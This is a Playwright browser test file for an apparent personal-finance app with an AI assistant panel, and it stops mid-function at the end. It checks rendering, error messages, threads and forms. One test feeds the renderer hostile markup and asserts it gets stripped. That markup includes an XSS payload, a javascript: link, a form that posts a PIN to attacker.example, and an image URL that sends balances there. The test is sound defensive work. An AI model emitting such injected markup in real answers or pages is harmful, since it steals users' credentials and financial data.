"""Browser pass over every page, as every persona, in Daylight and Midnight.

    uv sync --all-extras && uv run playwright install chromium
    BANKO_UI_TESTS=1 DATABASE_URL="postgresql://root@localhost:26258/defaultdb?sslmode=disable" \
        uv run pytest tests/ui -q -p no:cacheprovider

Boots the app on port 5073 with AI_SERVICE=ollama. No page may log a console
error; every page is screenshotted to artifacts/ui/."""

import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(os.getenv("BANKO_UI_TESTS") != "1", reason="set BANKO_UI_TESTS=1 to run the browser pass")
playwright = pytest.importorskip("playwright.sync_api")
expect = playwright.expect

PORT = 5073
BASE = f"http://127.0.0.1:{PORT}"
OUT = Path(__file__).resolve().parents[2] / "artifacts" / "ui"
PAGES = ["/", "/accounts", "/transactions", "/cashflow", "/budget", "/recurring", "/goals", "/assistant",
         "/coach", "/agents", "/settings"]
PERSONAS = ["maya", "sam", "riley"]

# The assistant panel tests mock the assistant API with page.route, so no
# model runs and the test decides when each answer arrives.
OLD_THREAD = "22222222-2222-4222-8222-222222222222"
NEW_THREAD = "33333333-3333-4333-8333-333333333333"
LEGACY_THREAD = "44444444-4444-4444-8444-444444444444"
OTHER_USERS_THREAD = "55555555-5555-4555-8555-555555555555"
HISTORY = {"thread_id": OLD_THREAD, "title": "Yesterday's chat", "active_receipt": None,
           "messages": [{"role": "user", "content": "What did I spend on coffee?"},
                        {"role": "assistant", "content": "You spent $12.40 on coffee."}]}


def _sse(*events) -> str:
    return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events)


ANSWER = _sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}),
              ("token", {"text": "You spent $42.10 on dining."}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                          "route": "aggregate", "meta": {"trace": []}}),
              ("done", {}))
TRACED = _sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                          "route": "aggregate", "meta": {"trace": [
                              {"label": "Answer cache", "detail": "miss", "ms": None, "status": "miss", "kind": "cache"},
                              {"label": "Model", "detail": "", "ms": 6339.4, "status": "success", "kind": "llm"},
                              {"label": "Aggregation SQL", "detail": "$42.10 across 3 transactions", "ms": 23.6,
                               "status": "success", "kind": "sql"}]}}),
              ("done", {}))
TITLED = "How much did I spend on dining?"
RECEIPT = _sse(("step", {"step": "ocr", "status": "done", "detail": "120 characters", "ms": 400}),
               ("receipt", {"document_id": "66666666-6666-4666-8666-666666666666", "status": "posted",
                            "merchant": "Blue Bottle", "amount": 9.75, "category": "Coffee", "thread_id": OLD_THREAD}),
               ("done", {}))
PIXEL = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b")


@pytest.fixture(scope="module")
def server():
    env = {**os.environ, "AI_SERVICE": "ollama", "COACH_KAFKA_ENABLED": "false",
           "CDC_WEBHOOK_HMAC_SECRET": "dev-only-secret", "PYTHONUNBUFFERED": "1"}
    assert ":26258/" in env.get("DATABASE_URL", ""), "the browser pass runs against the test database only"
    # `python -m banko_ai` ignores its arguments, so call the click group directly.
    proc = subprocess.Popen([sys.executable, "-c", "from banko_ai.cli import cli; cli()",
                             "run", "--host", "127.0.0.1", "--port", str(PORT)],
                            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.time() + 300
    while time.time() < deadline:
        try:
            if urllib.request.urlopen(BASE + "/api/health/ready", timeout=2).status == 200:
                break
        except Exception:
            time.sleep(2)
    else:
        proc.kill()
        pytest.fail("the app never became ready on port 5073")
    yield BASE
    proc.terminate()
    proc.wait(timeout=20)


@pytest.fixture(scope="module")
def browser():
    with playwright.sync_playwright() as p:
        b = p.chromium.launch()
        yield b
        b.close()


def _page(browser, theme):
    ctx = browser.new_context(color_scheme=theme, viewport={"width": 1360, "height": 900})
    page = ctx.new_page()
    errors = []
    page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
    page.on("pageerror", lambda e: errors.append(str(e)))
    return ctx, page, errors


def _login(page, base, persona):
    page.goto(base + "/login")
    page.locator(f'form:has(input[name="username"][value="{persona}"]) button').click()
    page.wait_for_url(base + "/")


@pytest.mark.parametrize("theme", ["light", "dark"])
@pytest.mark.parametrize("persona", PERSONAS)
def test_every_page_renders_without_console_errors(server, browser, persona, theme):
    OUT.mkdir(parents=True, exist_ok=True)
    ctx, page, errors = _page(browser, theme)
    try:
        _login(page, server, persona)
        for path in PAGES:
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            assert page.locator("[data-page]").count() == 1, path
            page.screenshot(path=str(OUT / f"{persona}-{theme}-{path.strip('/') or 'dashboard'}.png"), full_page=True)
        assert not errors, errors
    finally:
        ctx.close()


def test_stream_parser_handles_error_and_abort(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        parsed = page.evaluate("""() => {
            const a = Banko.parseSSE('event: token\\ndata: {"text": "Hi"}\\n\\nevent: error\\ndata: {"message": "x"}\\n\\nevent: tok');
            return { kinds: a.events.map(e => e.event), rest: a.rest };
        }""")
        assert parsed == {"kinds": ["token", "error"], "rest": "event: tok"}

        page.route("**/api/v1/assistant/threads/failing/messages", lambda route: route.fulfill(
            status=500, content_type="application/json",
            body='{"error": "Something went wrong on our side. Please try again."}'))
        failed = page.evaluate("""async () => {
            try { await Banko.stream("/api/v1/assistant/threads/failing/messages", { body: { message: "hi" }, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.message; }
        }""")
        assert failed == "Something went wrong on our side. Please try again."

        page.route("**/api/v1/assistant/threads/hanging/messages", lambda route: None)  # never answers
        stopped = page.evaluate("""async () => {
            const c = new AbortController();
            setTimeout(() => c.abort(), 300);
            try { await Banko.stream("/api/v1/assistant/threads/hanging/messages", { body: { message: "hi" }, signal: c.signal, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.name; }
        }""")
        assert stopped == "AbortError"
    finally:
        ctx.close()


def test_errors_people_see_are_plain_words(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        page.route("**/api/v1/transactions?q=*", lambda route: route.fulfill(
            status=503, json={"error": "warming_up", "detail": "waiting for the database (OperationalError)"}))
        seen = page.evaluate("""async () => {
            const out = {};
            try { null.accounts; } catch (e) { out.script = Banko.explain(e); }
            try { await Banko.api("http://127.0.0.1:9/api/v1/me"); } catch (e) { out.offline = Banko.explain(e); }
            try { await Banko.api("/api/v1/transactions?q=coffee"); } catch (e) { out.warming = Banko.explain(e); }
            out.message = Banko.explain(new Banko.ApiError(400, "Pick a category"));
            out.code = Banko.explain(new Banko.ApiError(503, "warming_up"));
            out.unknown = Banko.explain(new Banko.ApiError(500, "some_new_code"));
            out.nothing = Banko.explain(undefined);
            out.fallback = Banko.FALLBACK;
            return out;
        }""")
        fallback = seen.pop("fallback")
        assert seen["script"] == seen["offline"] == seen["unknown"] == seen["nothing"] == fallback
        assert seen["message"] == "Pick a category"
        assert seen["warming"] == seen["code"]
        assert "warming up" in seen["code"].lower()
        for text in seen.values():
            assert "warming_up" not in text and "OperationalError" not in text and "fetch" not in text.lower()
    finally:
        ctx.close()


def test_assistant_markup_is_sanitized(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        html = page.evaluate("""() => DOMPurify.sanitize(marked.parse('<img src=x onerror=alert(1)><script>alert(2)</script>**ok**'))""")
        assert "onerror" not in html and "<script" not in html and "<strong>ok</strong>" in html
        plain = page.evaluate("""() => Banko.stripCitations('Lunch [txn:abc] and [ txn : 1234 ] done')""")
        assert plain == "Lunch and done"
        # What the assistant really renders: one answer must not be able to
        # blank the app, collect a PIN, or fetch an outside image.
        hostile = ("**ok** <style>body{display:none}</style>\n\n"
                   "<form action='https://attacker.example/steal'><input name=pin><button>Verify</button></form>\n\n"
                   "![chart](https://attacker.example/p.png?q=balances) <img src=x onerror=alert(1)><script>alert(2)</script>\n\n"
                   "[click](javascript:alert(1)) and [the docs](https://www.cockroachlabs.com/docs/)\n\n"
                   "| Category | Total |\n|:--|--:|\n| Dining | $42 |\n\n- one\n- two [txn:abc]")
        rendered = page.evaluate("(s) => Banko.renderAnswer(s)", hostile)
        for banned in ("<style", "display:none", "<form", "<input", "<button", "<img", "attacker.example",
                       "javascript:", "onerror", "<script", "[txn:"):
            assert banned not in rendered, banned
        assert "<strong>ok</strong>" in rendered and "<table>" in rendered and "<li>one</li>" in rendered
        assert 'href="https://www.cockroachlabs.com/docs/"' in rendered and 'rel="noopener noreferrer"' in rendered
    finally:
        ctx.close()


def test_expired_session_goes_to_login(server, browser):
    # Not maya: a request without a session acts as maya, the default persona.
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "sam")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        ctx.clear_cookies()
        page.locator("button.b-f").first.click()
        page.wait_for_url(server + "/login", timeout=10000)
    finally:
        ctx.close()


class _PanelApi:
    """The assistant API the panel talks to, mocked. The history of the
    remembered thread is held until release(), so a test can let the user
    act first, which is what a slow checkpoint read looks like."""

    def __init__(self, page, answer=ANSWER):
        self.held, self.fetched, self.answer = [], [], answer
        page.route("**/api/v1/assistant/**", self._assistant)
        page.route("**/api/v1/receipts", lambda r: r.fulfill(status=200, content_type="text/event-stream", body=RECEIPT))
        page.route("**/api/v1/receipts/*/thumbnail", lambda r: r.fulfill(status=200, content_type="image/gif", body=PIXEL))
        page.route("**/api/v1/transactions?q=*", lambda r: r.fulfill(json={"items": []}))

    def _assistant(self, route):
        req = route.request
        path = urllib.parse.urlparse(req.url).path
        if req.method == "GET" and path.startswith("/api/v1/assistant/threads/"):
            self.fetched.append(path.rsplit("/", 1)[-1])
            if path.endswith(OLD_THREAD):
                self.held.append(route)
                return None
            return route.fulfill(status=404, json={"error": "not_found"})
        if req.method == "POST" and path.endswith("/messages"):
            return route.fulfill(status=200, content_type="text/event-stream", body=self.answer)
        if req.method == "POST" and path == "/api/v1/assistant/threads":
            return route.fulfill(status=201, json={"thread_id": NEW_THREAD, "title": "New chat", "message_count": 0})
        if req.method == "GET" and path == "/api/v1/assistant/threads":
            # The server titles a thread from its first question.
            return route.fulfill(json={"threads": [{"thread_id": NEW_THREAD, "title": TITLED, "message_count": 2,
                                                    "created_at": "2026-10-13T12:00:00+00:00",
                                                    "last_message_at": "2026-10-13T12:00:05+00:00"}]})
        return route.fallback()

    def release(self):
        while self.held:
            self.held.pop(0).fulfill(status=200, json=HISTORY)


def _remember_a_thread(page, base, persona) -> str:
    """Sign in, then reload with yesterday's thread remembered for this
    user, plus the entries the panel must never load: the old unkeyed one
    and another persona's."""
    _login(page, base, persona)
    uid = page.evaluate("() => Banko.shell.user.user_id")
    page.evaluate("""([uid, mine, legacy, other]) => {
        localStorage.setItem('banko.thread:' + uid, mine);
        localStorage.setItem('banko.thread', legacy);
        localStorage.setItem('banko.thread:00000000-0000-4000-8000-0000000000ff', other);
    }""", [uid, OLD_THREAD, LEGACY_THREAD, OTHER_USERS_THREAD])
    page.reload()
    page.wait_for_load_state("networkidle")
    return uid


def test_a_question_from_the_palette_survives_the_history_load(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.keyboard.press("Control+k")
        page.locator(".b-palette input").fill("how much did I spend on dining?")
        page.keyboard.press("Enter")
        page.wait_for_timeout(500)  # the question is asked before yesterday's history comes back
        api.release()
        chat = page.locator(".b-panel .b-chat")
        expect(chat).to_contain_text("how much did I spend on dining?")
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        expect(chat).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        assert api.fetched == [OLD_THREAD]
        assert not errors, errors
    finally:
        ctx.close()


def test_a_dropped_receipt_keeps_its_card_when_the_history_loads(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.evaluate("""() => {
            const dt = new DataTransfer();
            dt.items.add(new File(['receipt'], 'lunch.jpg', { type: 'image/jpeg' }));
            window.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
        }""")
        page.wait_for_timeout(500)
        api.release()
        card = page.locator(".b-panel .b-receipt")
        expect(card).to_contain_text("Blue Bottle")
        expect(page.locator(".b-panel .b-chat")).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(card).to_contain_text("Posted · Coffee")
        assert not errors, errors
    finally:
        ctx.close()


def test_asking_about_a_nudge_opens_a_new_thread_even_when_the_history_answers_late(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        uid = _remember_a_thread(page, server, "sam")
        page.evaluate("() => Banko.emit('banko:ask', { context: { kind: 'nudge', id: '77777777-7777-4777-8777-777777777777' } })")
        page.wait_for_timeout(500)
        api.release()
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        page.wait_for_timeout(500)
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        expect(page.locator(".b-panel .b-chat")).not_to_contain_text("What did I spend on coffee?")
        assert page.evaluate("(uid) => localStorage.getItem('banko.thread:' + uid)", uid) == NEW_THREAD
        assert not errors, errors
    finally:
        ctx.close()


def test_the_assistant_page_titles_the_thread_and_lists_its_trace(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=TRACED)
        _login(page, server, "sam")
        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        header = page.locator(".b-assist-page .b-panel-h .t")
        expect(header).to_have_text("New conversation")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
        expect(page.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        expect(header).to_have_text(TITLED)
        rows = page.locator("aside.b-trace .b-tl > div")
        expect(rows.filter(has_text="Answer cache")).to_have_text("Answer cachemiss")
        expect(rows.filter(has_text="Model")).to_have_text("Model6339 ms")
        expect(rows.filter(has_text="Aggregation SQL")).to_have_text("Aggregation SQL$42.10 across 3 transactions · 24 ms")
        assert not errors, errors
    finally:
        ctx.close()


def test_the_panel_trace_has_no_dangling_separator(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=TRACED)
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        panel = page.locator(".b-panel")
        expect(panel.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        expect(panel.locator(".b-panel-h")).to_contain_text(TITLED)
        panel.get_by_role("button", name="How this was answered").click()
        rows = panel.locator(".b-trace .b-tl > div")
        expect(rows.filter(has_text="Model")).to_have_text("Model6339 ms")
        expect(rows.filter(has_text="Answer cache")).to_have_text("Answer cachemiss")
        assert not errors, errors
    finally:
        ctx.close()


def test_a_failed_thread_keeps_the_question_and_an_empty_answer_stops_loading(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=_sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}), ("done", {})))
        failing = "**/api/v1/assistant/threads"
        page.route(failing, lambda route: route.fulfill(status=500, json={"error": "Something went wrong on our side."})
                   if route.request.method == "POST" else route.fallback())
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        panel = page.locator(".b-panel")
        expect(panel.locator("textarea")).to_have_value(TITLED)
        expect(page.locator(".b-toast.err")).to_contain_text("Something went wrong on our side.")
        expect(panel.locator(".b-msg-user")).to_have_count(0)

        page.unroute(failing)
        panel.get_by_role("button", name="Send").click()
        bot = panel.locator(".b-msg-bot")
        expect(bot.locator(".b-meta")).to_be_visible()
        expect(bot.locator(".b-skel")).to_be_hidden()
        expect(bot).to_contain_text(page.evaluate("() => Banko.FALLBACK"))
        # The browser logs the 500 this test returns; nothing else may show up.
        assert errors == ["Failed to load resource: the server responded with a status of 500 (Internal Server Error)"], errors
    finally:
        ctx.close()


def test_text_pasted_into_a_field_stays_text_even_with_an_image_along(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.route("**/api/v1/receipts", lambda r: r.fulfill(status=200, content_type="text/event-stream",
                                                             body=_sse(("error", {"message": "Not a receipt"}), ("done", {}))))
        _login(page, server, "maya")
        seen = page.evaluate("""() => {
            const got = [];
            window.addEventListener('banko:receipt', (e) => got.push(e.detail.file.name));
            const paste = (target, text) => {
                const dt = new DataTransfer();
                if (text) dt.setData('text/plain', text);
                dt.items.add(new File(['png'], 'slide.png', { type: 'image/png' }));
                return target.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
            };
            // Copied from Keynote: the text and a picture of it.
            const fieldKeptDefault = paste(document.querySelector('.b-palette input'), 'Q3 revenue');
            const inField = got.length;
            paste(document.body, '');
            return { fieldKeptDefault, inField, anywhere: got.length - inField };
        }""")
        assert seen == {"fieldKeptDefault": True, "inField": 0, "anywhere": 1}
    finally:
        ctx.close()


def test_forms_send_what_their_selects_show(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        sent = {}

        def capture(name, reply):
            def handler(route):
                if route.request.method in ("PUT", "POST"):
                    sent[name] = route.request.post_data_json
                    return route.fulfill(**reply)
                return route.fallback()
            return handler

        page.route("**/api/v1/budgets", capture("budget", {"json": {}}))
        page.route("**/api/v1/transfers", capture("transfer", {"status": 201, "json": {"status": "ok", "transfer_id": NEW_THREAD}}))
        _login(page, server, "riley")

        # Add a budget without touching the category select.
        page.goto(server + "/budget")
        page.wait_for_load_state("networkidle")
        page.get_by_role("button", name="Add a budget").click()
        form = page.locator("section form.b-card")
        shown = form.locator("select").input_value()
        form.locator("input").fill("120")
        form.get_by_role("button", name="Add", exact=True).click()
        expect(form).to_be_hidden()
        assert shown and sent["budget"]["category"] == shown

        # Move money: pick, as From, the account that To was showing.
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        page.get_by_role("button", name="Move money").click()
        dialog = page.locator("form.b-dialog")
        expect(dialog).to_be_visible()
        source, target = dialog.locator("select").nth(0), dialog.locator("select").nth(1)
        was_to = target.input_value()
        source.select_option(was_to)
        now_to = target.input_value()
        dialog.locator("input").fill("1.00")
        dialog.get_by_role("button", name="Move", exact=True).click()
        expect(dialog).to_be_hidden()
        assert sent["transfer"]["from_account"] == was_to
        assert sent["transfer"]["to_account"] == now_to != was_to
        assert not errors, errors
    finally:
        ctx.close()


def test_the_agents_feed_orders_live_and_stored_items_by_time(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        stored = [{"id": "receipt:1", "agent": "receipt", "kind": "posted", "title": "Stored at ten", "detail": "Posted",
                   "confidence": None, "region": None, "at": "2026-10-13T10:00:00.123456+00:00"}]
        page.route("**/api/v1/agents/activity", lambda r: r.fulfill(json={"items": stored}))
        page.route("**/api/v1/agents/stats", lambda r: r.fulfill(json={"agents": [], "today": {}}))
        _login(page, server, "maya")
        page.goto(server + "/agents")
        page.wait_for_load_state("networkidle")
        page.evaluate("""() => {
            const live = (message, timestamp) => Banko.emit('banko:agent', { source: 'activity', agent_type: 'fraud',
                status: 'completed', message, user_id: Banko.shell.user.user_id, timestamp });
            live('Live at half past ten', '2026-10-13T06:30:00-04:00');
            live('Live at nine', '2026-10-13T09:00:00+00:00');
        }""")
        rows = page.locator("section .b-s3 .b-bill")
        expect(rows).to_have_count(3)
        order = [next(t for t in ("half past ten", "Stored at ten", "Live at nine") if t in text)
                 for text in rows.all_inner_texts()]
        assert order == ["half past ten", "Stored at ten", "Live at nine"]
        assert not errors, errors
    finally:
        ctx.close()


PURCHASE_ID = "88888888-8888-4888-8888-888888888888"


def _purchase(**extra):
    """A transaction detail as GET /api/v1/transactions/<id> returns it."""
    base = {"id": PURCHASE_ID, "expense_id": PURCHASE_ID, "kind": "purchase", "posted_at": "2026-10-12",
            "amount": -9.75, "merchant": "Blue Bottle", "description": "Coffee", "category": "Coffee",
            "category_label": "Coffee", "category_icon": "☕", "payment_method": "Debit Card", "account_id": None,
            "similar": [], "residency": None, "receipt": None,
            "checks": {"duplicates": [], "decisions": [{"decision_id": "d1", "decision_type": "fraud_analysis",
                                                        "confidence": 0.0, "reasoning": "No indicators",
                                                        "action": {"fraud_detected": False},
                                                        "created_at": "2026-10-12T10:00:00+00:00"}]}}
    return {**base, **extra}


def test_a_fraud_check_shows_its_fraud_score_not_a_confidence(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.route(f"**/api/v1/transactions/{PURCHASE_ID}", lambda r: r.fulfill(json=_purchase()))
        page.route("**/api/v1/agents/activity", lambda r: r.fulfill(json={"items": [
            {"id": "decision:f", "agent": "fraud", "kind": "fraud_analysis", "title": "Fraud analysis",
             "detail": "No indicators", "confidence": 0.0, "region": None, "at": "2026-10-13T10:00:00+00:00"},
            {"id": "decision:b", "agent": "budget", "kind": "budget_check", "title": "Budget check",
             "detail": "On track", "confidence": 0.85, "region": None, "at": "2026-10-13T09:00:00+00:00"}]}))
        _login(page, server, "maya")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", PURCHASE_ID)
        drawer = page.locator("aside.b-drawer")
        expect(drawer).to_contain_text("✓ Fraud check passed · fraud score 0%")
        expect(drawer).not_to_contain_text("confidence")

        page.goto(server + "/agents")
        page.wait_for_load_state("networkidle")
        rows = page.locator("section .b-s3 .b-bill")
        expect(rows.filter(has_text="Fraud analysis")).to_contain_text("fraud score 0%")
        expect(rows.filter(has_text="Budget check")).to_contain_text("confidence 85%")
        assert not errors, errors
    finally:
        ctx.close()


def test_the_drawer_shows_purchase_checks_only_on_purchases(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        income_id = "99999999-9999-4999-8999-999999999999"
        residency = {"stored_in": "us-east-1", "home_region": "us-east-1"}
        page.route(f"**/api/v1/transactions/{PURCHASE_ID}", lambda r: r.fulfill(json=_purchase(residency=residency)))
        page.route(f"**/api/v1/transactions/{income_id}", lambda r: r.fulfill(json={
            "id": income_id, "kind": "income", "posted_at": "2026-10-10", "amount": 2500.0, "description": "Payroll deposit",
            "merchant": None, "category": None, "account_id": None, "similar": [], "residency": residency,
            "receipt": None, "checks": {"duplicates": [], "decisions": []}}))
        _login(page, server, "maya")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        drawer = page.locator("aside.b-drawer")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", income_id)
        expect(drawer).to_contain_text("Payroll deposit")
        expect(drawer.get_by_text("Agent checks")).to_be_hidden()
        expect(drawer.get_by_text("Not a duplicate")).to_be_hidden()
        expect(drawer).to_contain_text("loaded in")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", PURCHASE_ID)
        expect(drawer.get_by_text("Agent checks")).to_be_visible()
        expect(drawer.get_by_text("✓ Not a duplicate")).to_be_visible()
        expect(drawer).not_to_contain_text("read in")
        assert not errors, errors
    finally:
        ctx.close()


def test_goal_pace_tags_follow_the_goal(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        def goal(name, *, remaining, target_date, on_track):
            return {"goal_id": name, "name": name, "icon": "🎯", "target_amount": 1000, "target_date": target_date,
                    "account_id": NEW_THREAD, "saved": 1000 - remaining, "remaining": remaining,
                    "progress": (1000 - remaining) / 1000, "monthly_pace": 100,
                    "projected_completion": "2027-01-01" if remaining else "2026-10-13", "on_track": on_track}
        page.route("**/api/v1/goals", lambda r: r.fulfill(json={"items": [
            goal("Someday", remaining=600, target_date=None, on_track=False),
            goal("Finished late", remaining=0, target_date="2026-06-01", on_track=False),
            goal("Steady", remaining=500, target_date="2027-06-01", on_track=True),
            goal("Slipping", remaining=900, target_date="2026-11-01", on_track=False)]}))
        _login(page, server, "maya")
        page.goto(server + "/goals")
        page.wait_for_load_state("networkidle")
        cards = page.locator("section .b-grid > .b-card")
        tags = {name: cards.filter(has_text=name).locator(".b-tag") for name in ("Someday", "Finished late", "Steady", "Slipping")}
        expect(tags["Someday"]).to_have_count(0)
        expect(tags["Finished late"]).to_have_text("Done")
        expect(cards.filter(has_text="Finished late")).not_to_contain_text("Behind")
        expect(tags["Steady"]).to_have_text("On track")
        expect(tags["Slipping"]).to_have_text("Behind")
        assert not errors, errors
    finally:
        ctx.close()


NO_ACCOUNTS = {"accounts": [], "groups": {"cash": [], "credit": []}, "cash_total": 0, "credit_total": 0,
               "net_worth": 0, "utilization": 0}


def _no_money_yet(page, seeding):
    """A user whose history is not written yet: /me reports `seeding`, and
    the money endpoints answer the way they do before the first row lands."""
    def me(route):
        real = route.fetch().json()
        route.fulfill(json={**real, "seeding": seeding})
    page.route("**/api/v1/me", me)
    page.route("**/api/v1/accounts", lambda r: r.fulfill(json=NO_ACCOUNTS))
    page.route("**/api/v1/accounts/history*", lambda r: r.fulfill(json={"items": [
        {"month": m, "net_worth": 0} for m in ("2026-08", "2026-09", "2026-10")]}))
    page.route("**/api/v1/cashflow*", lambda r: r.fulfill(json={"months": [
        {"month": m, "income": 0, "spending": 0, "net": 0, "savings_rate": None} for m in ("2026-08", "2026-09", "2026-10")],
        "categories": [], "merchants": []}))


def test_pages_wait_for_seeding_and_offer_a_refresh_when_it_finishes(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        _no_money_yet(page, {"state": "running", "done": 1200, "total": 5000})
        for path in ("/accounts", "/cashflow"):
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            expect(page.get_by_text("Setting up your accounts")).to_be_visible()
            expect(page.get_by_text("Writing your history: 1200 of 5000 ledger entries")).to_be_visible()
            expect(page.locator(".b-bar.busy")).to_be_visible()  # a batch is in flight: the bar moves
            expect(page.locator("section .b-grid")).to_be_hidden()  # no $0.00 dressed up as a figure
            expect(page.get_by_text("No accounts yet")).to_have_count(0 if path == "/cashflow" else 1)
            expect(page.get_by_text("No accounts yet")).to_be_hidden()
        page.unroute("**/api/v1/me")
        page.unroute("**/api/v1/cashflow*")
        # Work in progress on the page, which a reload would throw away.
        page.evaluate("() => Banko.emit('banko:ask', {})")
        panel = page.locator(".b-panel")
        panel.locator("textarea").fill("a question I was still typing")
        page.evaluate("() => { window.__stayed = true; }")
        page.evaluate("() => Banko.emit('banko:seeding', { user_id: Banko.shell.user.user_id, state: 'done', done: 5000, total: 5000 })")
        expect(page.get_by_text("Your accounts are ready")).to_be_visible()
        expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        page.wait_for_timeout(500)
        assert page.evaluate("() => window.__stayed") is True
        expect(panel.locator("textarea")).to_have_value("a question I was still typing")
        page.keyboard.press("Escape")
        with page.expect_navigation():
            page.get_by_role("button", name="Refresh").click()
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Your accounts are ready")).to_be_hidden()
        expect(page.locator("section .b-grid")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_no_data_and_failed_seeding_show_real_next_steps(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        _no_money_yet(page, None)
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("No accounts yet")).to_be_visible()
        expect(page.locator("section").get_by_role("button", name="Add a receipt")).to_be_visible()
        page.goto(server + "/cashflow")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Nothing to chart yet")).to_be_visible()
        expect(page.locator("section .b-grid")).to_be_hidden()

        page.unroute("**/api/v1/me")
        _no_money_yet(page, {"state": "failed", "done": 800, "total": 5000})
        for path in ("/accounts", "/"):
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            expect(page.get_by_text("Your demo data didn't finish loading")).to_be_visible()
            expect(page.get_by_role("link", name="Open Settings")).to_be_visible()
            expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        # A seed that fails while the dashboard watches stops the bar too.
        page.unroute("**/api/v1/me")
        _no_money_yet(page, {"state": "running", "done": 10, "total": 5000})
        page.goto(server + "/")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Setting up your accounts")).to_be_visible()
        page.evaluate("() => Banko.emit('banko:seeding', { user_id: Banko.shell.user.user_id, state: 'failed', done: 20, total: 5000 })")
        expect(page.get_by_text("Your demo data didn't finish loading")).to_be_visible()
        expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        assert not errors, errors
    finally:
        ctx.close()


def test_midnight_takes_its_accent_shades_from_the_brand_accent(server, browser):
    ctx, page, errors = _page(browser, "dark")
    try:
        _login(page, server, "maya")
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        assert page.evaluate("() => document.documentElement.dataset.theme") == "dark"

        def shades():
            return page.evaluate("""() => {
                const card = document.createElement('div');
                card.className = 'b-card b-ins';
                document.body.appendChild(card);
                const out = { chart: Banko.charts.css('--chart-1'), insight: getComputedStyle(card).backgroundImage };
                card.remove();
                return out;
            }""")

        brand = shades()
        page.evaluate("() => document.documentElement.style.setProperty('--ac', '#E5484D')")  # BRAND_ACCENT, red
        red = shades()
        assert brand["chart"].startswith("#") and red["chart"].startswith("#")
        assert red["chart"] != brand["chart"] and red["insight"] != brand["insight"]
        r, g, b = (int(red["chart"][i:i + 2], 16) for i in (1, 3, 5))
        assert r > g and r > b, red["chart"]
        assert not errors, errors
    finally:
        ctx.close()


def test_transactions_survive_a_failed_category_fetch(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        purchase = page.evaluate("async () => (await Banko.api('/api/v1/transactions?kind=purchase&limit=1')).items[0]")
        calls = []

        def flaky(route):
